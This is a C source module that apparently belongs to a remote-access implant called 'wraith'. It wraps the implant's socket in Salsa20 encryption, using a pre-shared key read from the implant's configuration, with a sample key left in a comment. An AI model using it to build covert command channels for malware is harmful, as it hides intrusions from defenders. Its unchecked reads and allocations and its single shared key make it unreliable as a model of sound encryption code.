#include <safe_memset.h>
#include <stddef.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <salsa20.h>
#include <unistd.h>
#include <wraith.h>

struct s20_state {
    uint8_t     key1[16];
    uint8_t     key2[16];
    uint8_t     nonce1[8];
    uint8_t     nonce2[8];
    uint64_t    pos1;
    uint64_t    pos2;
    int         fd;
};

static void
s20_session_close(wraith_session_t *session)
{
    free(session->state);
}

static ssize_t
s20_session_read(wraith_session_t *session, char *buf, size_t nbyte)
{
    ssize_t nread;
    struct s20_state *state;
    
    state = (struct s20_state*)session->state;
    nread = read(state->fd, buf, nbyte);

    if (nread > 0) {
        s20_crypt(state->key1, S20_KEYLEN_128, state->nonce1, state->pos1, buf, nread);
        state->pos1 += nread;
        return nread;
    }

    return -1;
}

static ssize_t
s20_session_write(wraith_session_t *session, const char *buf, size_t nbyte)
{
    struct s20_state *state;

    char *bufp;
    char tmp[256];

    bufp = tmp;
    state = (struct s20_state*)session->state;

    if (nbyte >= 256) {
        bufp = (char*)malloc(nbyte);
    }

    memcpy(bufp, buf, nbyte);

    s20_crypt(state->key2, S20_KEYLEN_128, state->nonce2, state->pos2, bufp, nbyte);
    write(state->fd, bufp, nbyte);
    safe_memset(bufp, nbyte);

    if (bufp != tmp) {
        free(bufp);
    }

    state->pos2 += nbyte;

    return nbyte;
}

void
s20_session_wrap(wraith_session_t *session, int sock)
{
    extern struct wraith_config_block implant_config;
    char *key;
    struct s20_state *state;
    
    state = calloc(1, sizeof(struct s20_state));
    state->fd = sock;

    key = implant_config.encrypted_config.salsa20_psk; //"\xad\xb8\x7a\x3b\xbd\x4c\x59\xe0\xb9\xb8\xb3\x03\xda\x56\xc1\xc3";

    for (int i = 0; i < 16; i++) {
        state->key1[i] = key[i];
        state->key2[i] = key[i];
    }

    read(sock, state->nonce1, 8);
    read(sock, state->nonce2, 8);

    session->state = state;
    session->close_func = s20_session_close;
    session->read_func = s20_session_read;
    session->write_func = s20_session_write;
}